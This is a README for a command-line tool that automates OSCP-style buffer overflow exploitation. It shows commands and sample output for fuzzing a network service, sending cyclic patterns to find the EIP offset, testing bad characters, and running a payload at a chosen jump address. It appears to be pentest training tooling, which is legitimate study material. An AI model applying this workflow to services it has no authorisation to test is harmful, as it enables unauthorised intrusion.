# Overflow
A command-line tool for exploiting OSCP-like buffer overflows.

## 1. Installation
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ cabal update
$ cabal install
```

## 2. Usage
The help menu is pretty exhaustive, if you're stuck you should give it a look.

```sh
$ overflow --help
...
```
```sh
$ overflow <subcommand> --help
...
```

### 2.1. Fuzzing
You can use this tool to discover the length of the target buffer.

The fuzz subcommand will send increasingly long (size specified by the step
parameter) bytestrings comprised of As (0x41). When the server stops responding
the fuzzer assumes that it has reached a buffer overflow and reports the
possible length of the buffer.

```
$ overflow fuzz 127.0.0.1 4444 -S 100
    ───> Sending 100-byte payload to target...
    ───> Sending 200-byte payload to target...
    ───> Sending 300-byte payload to target...
    ───> Sending 400-byte payload to target...
    ───> Sending 500-byte payload to target...
Done! Length of buffer is in the range (400, 500].
```

### 2.2. Sending a Cyclic Pattern
You can use this tool to send a cyclic pattern of bytes to the server. Great
for discovering offsets of particular registers.

The pattern subcommand will generate and send a specified length cyclic pattern
of bytes to the target server, however, figuring out the offset to the EIP
register (for example) is up to you. 

```
$ overflow pattern 127.0.0.1 4444 -l 80
    ───> Sending 80-byte cyclic pattern to target.
Success! Finished sending pattern to target
```

```
$ nc -lvp 4444
Connection from 127.0.0.1:48870
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
```

### 2.3. Finding Bad Characters
You can use this tool to send every character from 0x00 to 0xFF to the target
service. It's only real use is to discover bad characters (e.g. characters that
the service treats differently in execution).

The badchars subcommand will generate and send a bytestring consisting of every
possible character to the target service. However, determining which characters
are bad is up to you.

```
$ overflow badchars 127.0.0.1 4444 -o 160
    ───> Sending characters to target.
Done! Finished sending characters to target.
```

You can also exclude particular characters from the payload sent to the target.
```
$ overflow badchars 127.0.0.1 4444 -o 160 -e "\x00\x05\x1A"
    ───> Sending characters to target.
Done! Finished sending characters to target.
```

### 2.4. Running an Exploit
```sh
$ overflow exploit --help
```
```
Usage: overflow exploit HOST PORT (-o|--offset OFFSET) (-a|--address ADDRESS)
                        (-p|--payload PAYLOAD) [-p|--prefix PREFIX] 
                        [-s|--suffix SUFFIX]
  Attempts to execute a specified payload on target

Available options:
  HOST                     Target machine's IP address
  PORT                     Port the target service is running on
  -o,--offset OFFSET       The offset of the EIP register
  -a,--address ADDRESS     Jump address for executing shellcode
  -p,--payload PAYLOAD     Payload to be executed on target
  -p,--prefix PREFIX       (optional) Prefix to put before payload
  -s,--suffix SUFFIX       (optional) Suffix to put after payload
  -h,--help                Show this help text
```
